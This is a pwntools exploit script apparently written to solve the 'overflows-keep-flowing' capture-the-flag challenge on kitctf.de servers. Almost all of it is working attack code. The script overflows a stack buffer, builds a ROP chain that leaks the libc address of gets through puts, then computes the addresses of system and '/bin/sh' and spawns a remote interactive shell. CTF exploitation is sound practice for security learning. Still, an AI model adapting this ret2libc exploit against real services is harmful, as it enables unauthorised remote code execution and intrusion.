from pwn import *
context.log_level = 'debug'
# context.terminal = ["alacritty", "-e"] # Substitute your terminal

# Step 1: Connect to the binary with GDB, without GDB, or on our challenge servers
# python exploit.py GDB
# if args.GDB:
    # p = gdb.debug("./overflows-keep-flowing")
# python exploit.py REMOTE
# if args.REMOTE:
# p = remote('overflows-keep-flowing-0.chals.kitctf.de', 1337, ssl=True) # TODO: Proper domain
# else:
e = context.binary = ELF('./overflows-keep-flowing')
# r = process("./overflows-keep-flowing")
r = remote('overflows-keep-flowing-0.chals.kitctf.de', 1337, ssl=True)
# r = remote('overflow-in-the-fl4gtory-0.chals.kitctf.de', 1337, ssl=True)

# lib = e.libc
lib= ELF('libc6_2.36-0ubuntu4_amd64.so')
main= 0x0000000000401212
puts_plt =0x401080
gets_got = 0x404030
pop_rdi_ret = 0x00000000004012b3
offset_setbuf = 0x8bad0
offset_system = 0x52290
offset_binsh = 0x1b45bd
ret =0x000000000040101a

payload = b"a"*256+b"b"*8+ flat( pop_rdi_ret, gets_got, puts_plt, main)
pause()
r.sendline(payload)
r.recvline()
gets_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("gets_libc: %#x" %gets_libc)
base_libc = gets_libc - lib.sym.gets
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("binsh_libc: %#x" %binsh_libc)

payload = b"a"*256+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, ret)
pause()
r.sendline(payload)
# r.sendline(b"cat flag.txt")

r.interactive()
# print(flag)